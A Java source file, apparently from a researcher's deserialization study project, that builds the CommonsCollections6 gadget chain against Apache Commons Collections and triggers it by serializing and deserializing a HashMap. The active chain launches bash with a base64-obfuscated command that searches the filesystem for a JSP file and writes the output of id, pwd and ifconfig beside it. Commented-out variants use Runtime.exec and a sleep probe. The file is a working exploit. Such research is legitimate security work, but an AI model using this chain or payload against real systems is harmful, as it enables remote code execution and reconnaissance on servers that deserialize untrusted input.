package org.su18.serialize.ysoserial.CommonCollections.CommonCollections6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.su18.serialize.utils.SerializeUtil;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @author su18
 */
public class CC6WithHashMap {

	public static void main(String[] args) throws Exception {

		// 初始化 HashMap
		HashMap<Object, Object> hashMap = new HashMap<>();

//		// 创建 ChainedTransformer
//		Transformer[] transformers = new Transformer[]{
//				new ConstantTransformer(Runtime.class),
//				new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
//				new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
//				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"bash -c {echo,ZmluZCAvIC1uYW1lIGNvbW1vbi1wcml2YXRlLmpzcHx3aGlsZSByZWFkIGY7ZG8gc2ggLWMgJ2lkO3B3ZDtpZmNvbmZpZycgPiQoZGlybmFtZSAkZikvdGVzdC50eHQ7ZG9uZQ==}|{base64,-d}|{bash,-i}"})
//		};

		// 创建 ProcessBuilder
		Transformer[] transformers = new Transformer[]{
				new ConstantTransformer(ProcessBuilder.class),
				new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String[].class}}),
				new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new String[]{"bash","-c","{echo,ZmluZCAvIC1uYW1lIGNvbW1vbi1wcml2YXRlLmpzcHx3aGlsZSByZWFkIGY7ZG8gc2ggLWMgJ2lkO3B3ZDtpZmNvbmZpZycgPiQoZGlybmFtZSAkZikvdGVzdC50eHQ7ZG9uZQ==}|{base64,-d}|{bash,-i}"}}}),
				new InvokerTransformer("start", new Class[]{}, new Object[]{})
		};

		// Sleep
//		Transformer[] transformers = new Transformer[]{
//				new ConstantTransformer(java.lang.Thread.class),
//				new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"currentThread", null}),
//				new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
//				new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{Long.parseLong("10000")}),
//		};


		// 创建一个空的 ChainedTransformer
		ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{});

		// 创建 LazyMap 并引入 TiedMapEntry
		Map          lazyMap = LazyMap.decorate(new HashMap(), fakeChain);
		TiedMapEntry entry   = new TiedMapEntry(lazyMap, "su18");

		hashMap.put(entry, "su18");

		//用反射再改回真的chain
		Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
		f.setAccessible(true);
		f.set(fakeChain, transformers);
		//清空由于 hashMap.put 对 LazyMap 造成的影响
		lazyMap.clear();

		// 反射调用 HashMap 的 putVal 方法
//		Method[] m = Class.forName("java.util.HashMap").getDeclaredMethods();
//		for (Method method : m) {
//			if ("putVal".equals(method.getName())) {
//				method.setAccessible(true);
//				method.invoke(hashMap, -1, entry, 0, false, true);
//			}
//		}

		SerializeUtil.writeObjectToFile(hashMap);
		SerializeUtil.readFileObject();

		Thread.sleep(1000000);


//		SerializeUtil.readFileObject("aaa.bin");


	}

}
